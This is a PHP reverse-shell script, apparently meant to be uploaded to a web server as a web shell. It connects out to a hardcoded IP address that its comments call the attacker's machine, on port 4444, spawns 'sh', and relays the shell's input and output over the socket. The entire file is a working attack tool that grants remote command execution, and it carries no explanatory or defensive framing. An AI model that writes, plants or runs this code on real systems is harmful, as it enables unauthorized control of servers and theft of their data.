<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Open a socket connection to the attacker's machine
$sock = fsockopen($ip, $port);

// If the socket connection is successful, create a shell
if ($sock) {
    $proc = proc_open('sh', [
        0 => ['pipe', 'r'], // stdin
        1 => ['pipe', 'w'], // stdout
        2 => ['pipe', 'w'], // stderr
    ], $pipes);

    // Forward data between the shell and the attacker
    while (1) {
        $input = fgets($sock, 1024);
        fwrite($pipes[0], $input);
        $output = fgets($pipes[1], 1024);
        fwrite($sock, $output);
        $error = fgets($pipes[2], 1024);
        fwrite($sock, $error);
    }

    // Close the pipes and socket
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($proc);
}
?>
